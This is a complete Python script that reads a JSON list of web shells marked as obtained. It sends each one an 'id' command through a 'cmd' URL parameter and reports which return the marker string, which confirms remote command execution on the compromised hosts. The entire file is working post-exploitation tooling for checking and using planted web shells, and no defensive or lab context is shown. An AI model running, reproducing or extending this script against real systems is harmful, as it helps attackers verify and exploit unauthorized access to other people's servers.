#!/usr/bin/env python3
"""Verifies RCE on obtained shells."""
import argparse, json, urllib.request

MARKER_CMD = "echo KSIR_VERIFY_$(id)"

def verify_shell(shell: dict, timeout: int) -> dict:
    result = {"url": shell.get("shell_path"), "verified": False, "output": None}
    if not result["url"]:
        return result
    try:
        import urllib.parse
        url = result["url"] + "&cmd=" + urllib.parse.quote(MARKER_CMD)
        with urllib.request.urlopen(url, timeout=timeout) as resp:
            body = resp.read(512).decode("utf-8", errors="ignore")
        result["verified"] = "KSIR_VERIFY_" in body
        result["output"] = body[:200]
    except Exception as e:
        result["error"] = str(e)
    return result

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--shells", required=True)
    parser.add_argument("--timeout", type=int, default=10)
    args = parser.parse_args()
    with open(args.shells) as f:
        shells = json.load(f)
    obtained = [s for s in shells if s.get("status") == "shell_obtained"]
    results = [verify_shell(s, args.timeout) for s in obtained]
    verified = [r for r in results if r.get("verified")]
    print(json.dumps(results, indent=2))
    print(f"\nVerified: {len(verified)}/{len(obtained)}")

if __name__ == "__main__":
    main()
